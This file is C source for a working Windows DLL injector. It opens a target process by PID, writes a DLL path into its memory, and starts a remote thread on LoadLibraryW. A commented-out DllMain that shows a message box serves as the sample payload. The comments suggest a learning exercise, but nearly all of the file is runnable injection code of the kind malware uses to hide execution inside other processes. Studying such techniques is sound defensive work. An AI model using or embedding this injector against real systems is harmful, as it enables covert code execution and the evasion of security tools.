#include <windows.h>
#include <stdio.h>

// A DLL is a Dynamic Link Library, it's a library that can be loaded at runtime, and a collection
// of data/functions that an application in Windows needs in order to run. Serves as a shared library
// to modularize code and reduce code duplication.
// DLL entry point is DllMain, which is called when the DLL is loaded and unloaded from a process.

const char *k = "[+]";
const char *i = "[*]";
const char *e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hModule = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[] = L"C:\\Users\\user\\Desktop\\dll.dll";

/* DLL Main to create a Dll, when excecuting the command should be something like: 
    rundll32.exe dll.dll, DLLMain

 hinstDLL: handle to the DLL module
 fdwReason: reason for calling function
 lpReserved: reserved
BOOL WINAPI DLLMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

    // Perform actions based on the reason for calling.
    switch (fdwReason){

    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        MessageBoxW(NULL, L"Hello from DLL!", L"Hi", MB_ICONEXCLAMATION | MB_OK);
        break;
    }

    return TRUE; // Successful DLL_PROCESS_ATTACH.
}

*/ 

int main(int argc, char *argv[])
{

    if (argc < 2)
    {
        printf("%s Usage: %s <PID>\n", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s trying to inject DLL into PID: %d\n", i, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL)
    {
        printf("%s failed to open the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (rBuffer == NULL)
    {
        printf("%s failed to allocate memory in the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    if (!WriteProcessMemory(hProcess, rBuffer, dllPath, sizeof(dllPath), NULL))
    {
        printf("%s failed to write to the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    hModule = GetModuleHandleA("kernel32.dll");

    if (hModule == NULL)
    {
        printf("%s failed to get a handle to kernel32.dll (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryW"), rBuffer, 0, NULL);

    if (hThread == NULL)
    {
        printf("%s failed to create a remote thread in the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s DLL injected successfully\n", k);

    return EXIT_SUCCESS;
}
